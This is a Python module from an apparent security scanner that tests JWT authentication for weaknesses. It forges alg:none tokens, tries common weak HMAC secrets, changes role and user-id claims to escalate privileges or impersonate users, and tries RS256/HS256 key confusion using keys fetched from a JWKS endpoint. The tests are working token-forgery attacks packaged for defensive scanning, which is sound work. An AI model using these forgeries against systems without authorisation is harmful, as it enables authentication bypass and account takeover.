"""JWT attack scanner.

Tests JWT implementations for common vulnerabilities:
1. Algorithm 'none' bypass -- forge token with alg:none, test if accepted
2. Weak secrets -- try signing with common secrets
3. RS256/ES256 key confusion -- try HMAC signing with the public key
4. JWKS endpoint exposure -- check if /.well-known/jwks.json is accessible
5. Token in URL detection -- check for JWT tokens in query strings
6. Missing claims -- check for exp, iat, iss
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import logging
import re
from typing import Any

import httpx

from isitsecure.engine.auth.protocols import AuthSession
from isitsecure.engine.constants import (
    DeepScanConfig,
    JWTAttackConfig,
    SharedPatterns,
)
from isitsecure.engine.shared.jwt_utils import (
    decode_jwt_header as _shared_decode_jwt_header,
    decode_jwt_payload as _shared_decode_jwt_payload,
)
from isitsecure.engine.shared.progress import emit
from isitsecure.engine.shared.rate_limited_client import RateLimitedClient
from isitsecure.engine.models import (
    DeepFinding,
    DiscoveredEndpoint,
    FindingSource,
)
from isitsecure.engine.enums import FindingCategory, SeverityLevel
from isitsecure.engine.ingestion.snapshot import CodebaseSnapshot

logger = logging.getLogger(__name__)


class JWTScanner:
    """Tests JWT implementation for common vulnerabilities.

    Takes an AuthSession (which has an access_token JWT) and a test
    endpoint URL. Manipulates JWTs using base64 + json + hmac
    (no PyJWT dependency).
    """

    HTTP_STATUS_OK_LOWER = 200
    HTTP_STATUS_OK_UPPER = 300
    JWT_PARTS_COUNT = 3
    JWT_HEADER_INDEX = 0
    JWT_PAYLOAD_INDEX = 1
    JWT_SIGNATURE_INDEX = 2

    def __init__(
        self,
        auth_session: AuthSession | None = None,
        test_endpoint: str | None = None,
    ) -> None:
        self._auth_session = auth_session
        self._test_endpoint = test_endpoint

    @property
    def scanner_name(self) -> str:
        """Unique name identifying this scanner."""
        return JWTAttackConfig.SCANNER_NAME

    @property
    def scan_categories(self) -> list[FindingCategory]:
        """Finding categories this scanner can detect."""
        return [FindingCategory.AUTH_WEAKNESS]

    async def scan(
        self,
        endpoints: list[DiscoveredEndpoint],
        snapshot: CodebaseSnapshot | None = None,
    ) -> list[DeepFinding]:
        """Run JWT vulnerability tests.

        Args:
            endpoints: Endpoints discovered during the discovery phase.
            snapshot: Optional codebase snapshot (unused by this scanner).

        Returns:
            List of unified findings from this scanner.
        """
        findings: list[DeepFinding] = []

        # Phase 5: Token in URL detection (no auth required)
        token_url_findings = self._check_token_in_url(endpoints)
        findings.extend(token_url_findings)

        if not self._auth_session or not self._auth_session.access_token:
            logger.info("JWTScanner: no auth session with JWT, skipping")
            return findings

        token = self._auth_session.access_token
        payload = self._decode_jwt_payload(token)
        if payload is None:
            logger.info("JWTScanner: could not decode JWT payload, skipping")
            return findings

        # Phase 1: Check for missing claims
        claim_findings = self._check_missing_claims(payload)
        findings.extend(claim_findings)

        # Phase 2: Test algorithm none attack
        test_url = self._test_endpoint or self._pick_test_endpoint(endpoints)
        if test_url:
            emit(f"JWT: alg=none forgery against {test_url}")
            alg_none_finding = await self._test_alg_none(token, payload, test_url)
            if alg_none_finding:
                findings.append(alg_none_finding)

            # Phase 3: Test weak secrets
            emit(f"JWT: trying weak secrets on {test_url}")
            weak_secret_finding = await self._test_weak_secrets(
                token, payload, test_url
            )
            if weak_secret_finding:
                findings.append(weak_secret_finding)

            # Phase 3.5: Claim manipulation (privilege escalation)
            emit(f"JWT: claim manipulation on {test_url}")
            claim_findings = await self._test_claim_manipulation(
                token, payload, test_url
            )
            findings.extend(claim_findings)

            # Phase 4: RS256/ES256 key confusion via JWKS
            base_url = self._extract_base_url(test_url)
            if base_url:
                emit(f"JWT: key-confusion via JWKS on {test_url}")
                key_confusion_findings = await self._test_key_confusion(
                    payload, test_url, base_url, token
                )
                findings.extend(key_confusion_findings)

        logger.info("JWTScanner: %d findings", len(findings))
        return findings

    # ------------------------------------------------------------------
    # JWT decoding (base64, no PyJWT)
    # ------------------------------------------------------------------

    def _decode_jwt_payload(self, token: str) -> dict[str, Any] | None:
        """Decode JWT payload without verification using base64."""
        return _shared_decode_jwt_payload(token)

    def _decode_jwt_header(self, token: str) -> dict[str, Any] | None:
        """Decode JWT header without verification."""
        return _shared_decode_jwt_header(token)

    # ------------------------------------------------------------------
    # Phase 1: Missing claims
    # ------------------------------------------------------------------

    def _check_missing_claims(self, payload: dict[str, Any]) -> list[DeepFinding]:
        """Check JWT payload for missing recommended claims."""
        findings: list[DeepFinding] = []

        # Check specifically for missing exp (higher severity)
        if "exp" not in payload:
            findings.append(
                DeepFinding(
                    source=FindingSource.DAST_URL,
                    category=FindingCategory.AUTH_WEAKNESS,
                    severity=SeverityLevel.HIGH,
                    title=JWTAttackConfig.TITLE_MISSING_EXP,
                    description=JWTAttackConfig.DESC_MISSING_EXP,
                    technical_detail=(
                        f"JWT payload claims: {list(payload.keys())}\n"
                        f"Missing: exp (expiration)"
                    ),
                    evidence="JWT payload has no 'exp' claim",
                    confidence=JWTAttackConfig.CONFIDENCE_MISSING_EXP,
                    scanner_name=self.scanner_name,
                )
            )

        # Check for other missing recommended claims
        missing_claims = [
            claim for claim in JWTAttackConfig.REQUIRED_CLAIMS
            if claim not in payload and claim != "exp"  # exp handled above
        ]

        if missing_claims:
            findings.append(
                DeepFinding(
                    source=FindingSource.DAST_URL,
                    category=FindingCategory.AUTH_WEAKNESS,
                    severity=SeverityLevel.LOW,
                    title=JWTAttackConfig.TITLE_MISSING_CLAIMS,
                    description=JWTAttackConfig.DESC_MISSING_CLAIMS.format(
                        claims=", ".join(missing_claims),
                    ),
                    technical_detail=(
                        f"JWT payload claims: {list(payload.keys())}\n"
                        f"Missing recommended: {missing_claims}"
                    ),
                    evidence=f"Missing claims: {', '.join(missing_claims)}",
                    confidence=JWTAttackConfig.CONFIDENCE_MISSING_CLAIMS,
                    scanner_name=self.scanner_name,
                )
            )

        return findings

    # ------------------------------------------------------------------
    # Negative control (shared by every forgery test)
    # ------------------------------------------------------------------

    CONTROL_TOKEN = "invalid.invalid.invalid"

    def _is_2xx(self, response: Any) -> bool:
        return self.HTTP_STATUS_OK_LOWER <= response.status_code < self.HTTP_STATUS_OK_UPPER

    async def _fetch_controls(
        self, client: Any, test_url: str, original_token: str
    ) -> tuple[Any, Any]:
        """Return (control, baseline) responses for the endpoint.

        control  = same request with a clearly invalid token.
        baseline = same request with the real captured token.
        """
        control = await client.get(
            test_url, headers={"Authorization": f"Bearer {self.CONTROL_TOKEN}"}
        )
        baseline = await client.get(
            test_url, headers={"Authorization": f"Bearer {original_token}"}
        )
        return control, baseline

    def _forgery_accepted(self, forged: Any, control: Any, baseline: Any) -> bool:
        """True only when the forged token is treated differently from garbage.

        A forged 2xx counts only if the garbage-token control was NOT also
        accepted, or (when the control was accepted too) the forged response
        body matches the real-token baseline and differs from the control body
        (body discrimination). Otherwise the endpoint ignores the token.
        """
        if not self._is_2xx(forged):
            return False
        if not self._is_2xx(control):
            return True
        forged_text = getattr(forged, "text", None)
        control_text = getattr(control, "text", None)
        baseline_text = getattr(baseline, "text", None)
        if not all(isinstance(t, str) for t in (forged_text, control_text, baseline_text)):
            return False
        return (
            self._is_2xx(baseline)
            and forged_text == baseline_text
            and forged_text != control_text
        )

    # ------------------------------------------------------------------
    # Phase 2: Algorithm none attack
    # ------------------------------------------------------------------

    def _forge_alg_none_token(self, payload: dict[str, Any]) -> str:
        """Forge a JWT with algorithm set to 'none' and empty signature."""
        header = {"alg": "none", "typ": "JWT"}
        header_b64 = (
            base64.urlsafe_b64encode(json.dumps(header).encode())
            .rstrip(b"=")
            .decode()
        )
        payload_b64 = (
            base64.urlsafe_b64encode(json.dumps(payload).encode())
            .rstrip(b"=")
            .decode()
        )
        return f"{header_b64}.{payload_b64}."

    async def _test_alg_none(
        self,
        original_token: str,
        payload: dict[str, Any],
        test_url: str,
    ) -> DeepFinding | None:
        """Test if the server accepts a JWT with algorithm 'none'."""
        forged_token = self._forge_alg_none_token(payload)

        try:
            async with RateLimitedClient(
                max_concurrent=1,
                delay_seconds=SharedPatterns.DEFAULT_PROBE_DELAY,
                timeout_seconds=JWTAttackConfig.HTTP_TIMEOUT_SECONDS,
                user_agent=DeepScanConfig.USER_AGENT,
            ) as client:
                control, baseline = await self._fetch_controls(
                    client, test_url, original_token
                )
                response = await client.get(
                    test_url,
                    headers={"Authorization": f"Bearer {forged_token}"},
                )

                if self._forgery_accepted(response, control, baseline):
                    return DeepFinding(
                        source=FindingSource.DAST_URL,
                        category=FindingCategory.AUTH_WEAKNESS,
                        severity=SeverityLevel.CRITICAL,
                        title=JWTAttackConfig.TITLE_ALG_NONE,
                        description=JWTAttackConfig.DESC_ALG_NONE,
                        technical_detail=(
                            f"Sent forged JWT with alg:none to {test_url}\n"
                            f"Response status: {response.status_code}\n"
                            f"Negative control (garbage token) -> "
                            f"{control.status_code}"
                        ),
                        evidence=(
                            f"GET {test_url} with alg:none JWT -> "
                            f"{response.status_code} (garbage-token control -> "
                            f"{control.status_code})"
                        ),
                        confidence=JWTAttackConfig.CONFIDENCE_ALG_NONE,
                        scanner_name=self.scanner_name,
                        endpoint_url=test_url,
                        http_method="GET",
                    )
        except Exception as exc:
            logger.debug(
                JWTAttackConfig.ERROR_JWT_SCAN_FAILED.format(error=str(exc))
            )

        return None

    # ------------------------------------------------------------------
    # Phase 3: Weak secret testing
    # ------------------------------------------------------------------

    @staticmethod
    def _b64url_encode(data: bytes) -> str:
        """Base64url-encode without padding (JWT standard)."""
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

    def _sign_hs256(self, payload: dict[str, Any], secret: str) -> str:
        """Sign a JWT payload with HS256 using the given secret string."""
        return self._sign_hs256_raw(payload, secret.encode())

    def _sign_hs256_bytes(self, payload: dict[str, Any], secret_bytes: bytes) -> str:
        """Sign a JWT payload with HS256 using raw bytes as the secret.

        Used for key confusion attacks where the public key bytes are
        used as the HMAC secret.
        """
        return self._sign_hs256_raw(payload, secret_bytes)

    def _sign_hs256_raw(self, payload: dict[str, Any], key: bytes) -> str:
        """Core HS256 signing logic (DRY — used by both string and bytes variants)."""
        header_b64 = self._b64url_encode(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
        payload_b64 = self._b64url_encode(json.dumps(payload).encode())
        signing_input = f"{header_b64}.{payload_b64}"
        signature = hmac.new(key, signing_input.encode(), hashlib.sha256).digest()
        return f"{signing_input}.{self._b64url_encode(signature)}"

    async def _test_weak_secrets(
        self,
        original_token: str,
        payload: dict[str, Any],
        test_url: str,
    ) -> DeepFinding | None:
        """Try signing JWT with common weak secrets and test acceptance."""
        try:
            async with RateLimitedClient(
                max_concurrent=1,
                delay_seconds=SharedPatterns.DEFAULT_PROBE_DELAY,
                timeout_seconds=JWTAttackConfig.HTTP_TIMEOUT_SECONDS,
                user_agent=DeepScanConfig.USER_AGENT,
            ) as client:
                control, baseline = await self._fetch_controls(
                    client, test_url, original_token
                )
                for secret in JWTAttackConfig.COMMON_WEAK_SECRETS:
                    forged_token = self._sign_hs256(payload, secret)
                    response = await client.get(
                        test_url,
                        headers={"Authorization": f"Bearer {forged_token}"},
                    )

                    if self._forgery_accepted(response, control, baseline):
                        secret_display = secret if secret else "<empty string>"
                        return DeepFinding(
                            source=FindingSource.DAST_URL,
                            category=FindingCategory.AUTH_WEAKNESS,
                            severity=SeverityLevel.CRITICAL,
                            title=JWTAttackConfig.TITLE_WEAK_SECRET,
                            description=JWTAttackConfig.DESC_WEAK_SECRET.format(
                                secret=secret_display,
                            ),
                            technical_detail=(
                                f"Signed JWT with secret '{secret_display}' and "
                                f"sent to {test_url}\n"
                                f"Response status: {response.status_code}\n"
                                f"Negative control (garbage token) -> "
                                f"{control.status_code}"
                            ),
                            evidence=(
                                f"GET {test_url} with JWT signed by "
                                f"'{secret_display}' -> {response.status_code} "
                                f"(garbage-token control -> {control.status_code})"
                            ),
                            confidence=JWTAttackConfig.CONFIDENCE_WEAK_SECRET,
                            scanner_name=self.scanner_name,
                            endpoint_url=test_url,
                            http_method="GET",
                        )
        except Exception as exc:
            logger.debug(
                JWTAttackConfig.ERROR_JWT_SCAN_FAILED.format(error=str(exc))
            )

        return None

    # ------------------------------------------------------------------
    # Phase 3.5: Claim manipulation
    # ------------------------------------------------------------------

    async def _test_claim_manipulation(
        self,
        original_token: str,
        payload: dict[str, Any],
        test_url: str,
    ) -> list[DeepFinding]:
        """Test if server accepts JWTs with modified privilege claims.

        Modifies claims like role, is_admin, sub in the JWT payload
        and re-signs with the original algorithm. If the server accepts
        the forged token (2xx), it trusts claims without proper
        signature verification.

        Two attack types:
        1. Escalation: set role/is_admin to admin values
        2. Impersonation: swap sub/user_id to another user's ID
        """
        findings: list[DeepFinding] = []

        # Get original header to preserve the algorithm
        header = self._decode_jwt_header(original_token)
        original_alg = header.get("alg", "HS256") if header else "HS256"

        # Only test if alg is HS256 (we can forge with weak/empty secrets)
        # For RS256/ES256 we can't sign without the private key
        if original_alg.upper() not in ("HS256", "HS384", "HS512"):
            return findings

        try:
            async with RateLimitedClient(
                max_concurrent=1,
                delay_seconds=SharedPatterns.DEFAULT_PROBE_DELAY,
                timeout_seconds=JWTAttackConfig.HTTP_TIMEOUT_SECONDS,
                user_agent=DeepScanConfig.USER_AGENT,
            ) as client:
                # Baseline (original token must be 2xx) + negative control
                control, baseline = await self._fetch_controls(
                    client, test_url, original_token
                )
                if not self._is_2xx(baseline):
                    return findings  # Can't establish baseline

                # Test 1: Escalation mutations
                for claim, value, desc in JWTAttackConfig.CLAIM_ESCALATION_MUTATIONS:
                    mutated_payload = {**payload, claim: value}
                    # Try signing with empty secret (most common misconfiguration)
                    forged = self._sign_hs256(mutated_payload, "")
                    response = await client.get(
                        test_url,
                        headers={"Authorization": f"Bearer {forged}"},
                    )

                    if self._forgery_accepted(response, control, baseline):
                        findings.append(DeepFinding(
                            source=FindingSource.DAST_URL,
                            category=FindingCategory.AUTH_WEAKNESS,
                            severity=SeverityLevel.CRITICAL,
                            title=JWTAttackConfig.TITLE_CLAIM_ESCALATION.format(
                                claim=claim, value=value,
                            ),
                            description=JWTAttackConfig.DESC_CLAIM_ESCALATION.format(
                                claim=claim, value=value, desc=desc,
                            ),
                            technical_detail=(
                                f"Modified JWT claim '{claim}' to '{value}' "
                                f"and signed with empty secret.\n"
                                f"Server accepted at {test_url} "
                                f"(status: {response.status_code})"
                            ),
                            evidence=(
                                f"GET {test_url} with '{claim}={value}' in "
                                f"JWT -> {response.status_code}"
                            ),
                            confidence=JWTAttackConfig.CONFIDENCE_CLAIM_MANIPULATION,
                            scanner_name=self.scanner_name,
                            endpoint_url=test_url,
                            http_method="GET",
                        ))
                        return findings  # One confirmed escalation is enough

                # Test 2: Identity impersonation
                for claim in JWTAttackConfig.CLAIM_IDENTITY_FIELDS:
                    if claim not in payload:
                        continue
                    mutated_payload = {
                        **payload,
                        claim: JWTAttackConfig.CLAIM_IMPERSONATION_VALUE,
                    }
                    forged = self._sign_hs256(mutated_payload, "")
                    response = await client.get(
                        test_url,
                        headers={"Authorization": f"Bearer {forged}"},
                    )

                    if self._forgery_accepted(response, control, baseline):
                        findings.append(DeepFinding(
                            source=FindingSource.DAST_URL,
                            category=FindingCategory.AUTH_WEAKNESS,
                            severity=SeverityLevel.CRITICAL,
                            title=JWTAttackConfig.TITLE_CLAIM_ESCALATION.format(
                                claim=claim,
                                value=JWTAttackConfig.CLAIM_IMPERSONATION_VALUE,
                            ),
                            description=JWTAttackConfig.DESC_CLAIM_ESCALATION.format(
                                claim=claim,
                                value=JWTAttackConfig.CLAIM_IMPERSONATION_VALUE,
                                desc="user identity impersonation",
                            ),
                            technical_detail=(
                                f"Modified JWT claim '{claim}' to "
                                f"'{JWTAttackConfig.CLAIM_IMPERSONATION_VALUE}' "
                                f"(original: '{payload.get(claim)}').\n"
                                f"Server accepted at {test_url} "
                                f"(status: {response.status_code})"
                            ),
                            evidence=(
                                f"GET {test_url} with swapped '{claim}' "
                                f"in JWT -> {response.status_code}"
                            ),
                            confidence=JWTAttackConfig.CONFIDENCE_CLAIM_MANIPULATION,
                            scanner_name=self.scanner_name,
                            endpoint_url=test_url,
                            http_method="GET",
                        ))
                        return findings

        except Exception as exc:
            logger.debug(
                JWTAttackConfig.ERROR_JWT_SCAN_FAILED.format(error=str(exc))
            )

        return findings

    # ------------------------------------------------------------------
    # Phase 4: RS256/ES256 key confusion via JWKS
    # ------------------------------------------------------------------

    async def _test_key_confusion(
        self,
        payload: dict[str, Any],
        test_url: str,
        base_url: str,
        original_token: str = "",
    ) -> list[DeepFinding]:
        """Test for algorithm confusion by using public key as HMAC secret.

        Steps:
        1. Fetch JWKS from /.well-known/jwks.json
        2. If found, report the exposure as an informational finding
        3. Extract public key material from each JWK
        4. Sign JWT with HS256 using the public key bytes as the secret
        5. If accepted, report CRITICAL key confusion vulnerability
        """
        findings: list[DeepFinding] = []
        jwks_url = f"{base_url}{JWTAttackConfig.JWKS_ENDPOINT_PATH}"

        try:
            async with RateLimitedClient(
                max_concurrent=1,
                delay_seconds=SharedPatterns.DEFAULT_PROBE_DELAY,
                timeout_seconds=JWTAttackConfig.HTTP_TIMEOUT_SECONDS,
                user_agent=DeepScanConfig.USER_AGENT,
            ) as client:
                # Step 1: Fetch JWKS
                jwks_response = await client.get(jwks_url)

                if jwks_response.status_code >= 400:
                    return findings

                # Step 2: Report JWKS exposure (only when it really is a JWKS)
                try:
                    jwks_data = jwks_response.json()
                except (json.JSONDecodeError, ValueError):
                    return findings
                if not isinstance(jwks_data, dict) or not isinstance(
                    jwks_data.get("keys"), list
                ):
                    return findings
                findings.append(
                    DeepFinding(
                        source=FindingSource.DAST_URL,
                        category=FindingCategory.AUTH_WEAKNESS,
                        severity=SeverityLevel.INFO,
                        title=JWTAttackConfig.TITLE_JWKS_EXPOSED,
                        description=JWTAttackConfig.DESC_JWKS_EXPOSED.format(
                            url=jwks_url,
                        ),
                        technical_detail=(
                            f"JWKS endpoint accessible at {jwks_url}\n"
                            f"Response status: {jwks_response.status_code}"
                        ),
                        evidence=f"GET {jwks_url} -> {jwks_response.status_code}",
                        confidence=JWTAttackConfig.CONFIDENCE_JWKS_EXPOSED,
                        scanner_name=self.scanner_name,
                        endpoint_url=jwks_url,
                        http_method="GET",
                    )
                )

                keys = jwks_data["keys"]
                if not keys:
                    return findings

                control, baseline = await self._fetch_controls(
                    client, test_url, original_token
                )

                # Step 4: Try key confusion with each key (PEM / DER forms)
                for jwk in keys:
                    if not isinstance(jwk, dict):
                        continue
                    response = None
                    for key_bytes in self._extract_public_key_candidates(jwk):
                        forged_token = self._sign_hs256_bytes(payload, key_bytes)
                        response = await client.get(
                            test_url,
                            headers={"Authorization": f"Bearer {forged_token}"},
                        )
                        if self._forgery_accepted(response, control, baseline):
                            break
                    else:
                        continue
                    if response is not None:
                        findings.append(
                            DeepFinding(
                                source=FindingSource.DAST_URL,
                                category=FindingCategory.AUTH_WEAKNESS,
                                severity=SeverityLevel.CRITICAL,
                                title=JWTAttackConfig.TITLE_KEY_CONFUSION,
                                description=JWTAttackConfig.DESC_KEY_CONFUSION,
                                technical_detail=(
                                    f"Fetched public key from {jwks_url}\n"
                                    f"Signed JWT with HS256 using public key "
                                    f"as HMAC secret.\n"
                                    f"Server accepted the forged token at "
                                    f"{test_url}\n"
                                    f"Response status: {response.status_code}\n"
                                    f"Key type: {jwk.get('kty', 'unknown')}, "
                                    f"kid: {jwk.get('kid', 'N/A')}"
                                ),
                                evidence=(
                                    f"GET {test_url} with HMAC-signed JWT "
                                    f"using public key -> {response.status_code}"
                                ),
                                confidence=JWTAttackConfig.CONFIDENCE_KEY_CONFUSION,
                                scanner_name=self.scanner_name,
                                endpoint_url=test_url,
                                http_method="GET",
                            )
                        )
                        # One confirmed confusion is enough
                        break

        except Exception as exc:
            logger.debug(
                JWTAttackConfig.ERROR_JWT_SCAN_FAILED.format(error=str(exc))
            )

        return findings

    def _extract_public_key_candidates(self, jwk: dict[str, Any]) -> list[bytes]:
        """Key material a confusable server would HMAC with, for an RSA JWK.

        Servers that pass the verification key straight to an HMAC verifier
        use the SubjectPublicKeyInfo PEM text (what ``jwt.verify(token, pem)``
        receives), or occasionally the DER bytes. Returns those candidates
        (PEM with trailing newline, PEM stripped, DER). EC keys are skipped:
        HS256-with-EC-key confusion is not the same bug.
        """
        if jwk.get("kty") != "RSA":
            return []
        try:
            from cryptography.hazmat.primitives import serialization
            from cryptography.hazmat.primitives.asymmetric.rsa import (
                RSAPublicNumbers,
            )

            def _b64_int(value: str) -> int:
                raw = base64.urlsafe_b64decode(value + "=" * (-len(value) % 4))
                return int.from_bytes(raw, "big")

            n_b64, e_b64 = jwk.get("n", ""), jwk.get("e", "")
            if not n_b64 or not e_b64:
                return []
            public_key = RSAPublicNumbers(_b64_int(e_b64), _b64_int(n_b64)).public_key()
            pem = public_key.public_bytes(
                serialization.Encoding.PEM,
                serialization.PublicFormat.SubjectPublicKeyInfo,
            )
            der = public_key.public_bytes(
                serialization.Encoding.DER,
                serialization.PublicFormat.SubjectPublicKeyInfo,
            )
            return [pem, pem.strip(), der]
        except Exception as exc:
            logger.debug("Failed to build public key candidates: %s", exc)
            return []

    # ------------------------------------------------------------------
    # Phase 5: Token in URL detection
    # ------------------------------------------------------------------

    def _check_token_in_url(
        self, endpoints: list[DiscoveredEndpoint]
    ) -> list[DeepFinding]:
        """Check if any discovered endpoints have JWT tokens in query strings.

        JWT tokens in URLs are logged in server access logs, browser history,
        and referrer headers, making them vulnerable to leakage.
        """
        findings: list[DeepFinding] = []
        seen_urls: set[str] = set()

        for endpoint in endpoints:
            url = endpoint.url
            if url in seen_urls:
                continue
            seen_urls.add(url)

            match = re.search(JWTAttackConfig.JWT_URL_PATTERN, url)
            if match:
                findings.append(
                    DeepFinding(
                        source=FindingSource.DAST_URL,
                        category=FindingCategory.AUTH_WEAKNESS,
                        severity=SeverityLevel.MEDIUM,
                        title=JWTAttackConfig.TITLE_TOKEN_IN_URL,
                        description=JWTAttackConfig.DESC_TOKEN_IN_URL.format(
                            url=url,
                        ),
                        technical_detail=(
                            f"JWT token found in query string of URL: {url}\n"
                            f"Matched parameter pattern: {match.group(0)[:50]}"
                        ),
                        evidence=f"JWT token in URL query string: {url[:100]}",
                        confidence=JWTAttackConfig.CONFIDENCE_TOKEN_IN_URL,
                        scanner_name=self.scanner_name,
                        endpoint_url=url,
                        http_method=endpoint.method.value,
                    )
                )

        return findings

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    @staticmethod
    def _pick_test_endpoint(endpoints: list[DiscoveredEndpoint]) -> str | None:
        """Pick a suitable endpoint for JWT testing (prefers auth-required)."""
        for ep in endpoints:
            if ep.requires_auth:
                return ep.url
        # Fall back to first endpoint if any
        return endpoints[0].url if endpoints else None

    @staticmethod
    def _extract_base_url(url: str) -> str | None:
        """Extract the base URL (scheme + host) from a full URL."""
        try:
            from urllib.parse import urlparse
            parsed = urlparse(url)
            if parsed.scheme and parsed.netloc:
                return f"{parsed.scheme}://{parsed.netloc}"
        except Exception:
            pass
        return None
